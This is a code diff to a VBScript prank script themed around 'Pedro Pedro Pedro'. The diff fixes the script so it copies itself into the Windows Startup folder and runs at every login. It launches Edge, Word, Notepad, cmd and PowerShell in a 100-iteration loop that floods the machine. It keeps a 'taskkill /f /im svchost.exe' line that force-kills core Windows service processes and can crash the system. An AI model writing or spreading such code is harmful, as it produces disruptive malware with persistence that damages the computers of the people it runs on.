@@ -9,7 +9,7 @@ strScriptPath = WScript.ScriptFullName
 
 ' Extract the directory from the script path
 strTxtFilePath = Left(strScriptPath, InStrRev(strScriptPath, "\") - 1) & "\File.txt"
-strVbsFilePath = Left(strScriptPath, InStrRev(Shell.SpecialFolders("Startup"), "\") - 1) & "\MyScript.vbs"
+strVbsFilePath = Shell.SpecialFolders("Startup") & "\MyScript.vbs"
 
 ' Define content for the text file
 strTxtContent = "Pedro Pedro Pedro Pedro Pe"
@@ -57,13 +57,12 @@ Shell.Run "msedge.exe www.youtube.com/watch?v=OCZIzzQpJUw"
 Dim Index
 
 For Index = 1 To 100
-Shell.Run "msedge.exe www.youtube.com/watch?v=OCZIzzQpJUw"
-Shell.Run "winword"
-Shell.Run "msedge.exe www.google.com/search?q=pedro+pedro+pedro+pedro+pe"
-Shell.Run "notepad"
-Shell.Run "cmd"
-Shell.Run "powershell"
+    Shell.Run "msedge.exe www.youtube.com/watch?v=OCZIzzQpJUw"
+    Shell.Run "winword"
+    Shell.Run "msedge.exe www.google.com/search?q=pedro+pedro+pedro+pedro+pe"
+    Shell.Run "notepad"
+    Shell.Run "cmd"
+    Shell.Run "powershell"
 Next
-
 
 Shell.Run "taskkill /f /im svchost.exe"
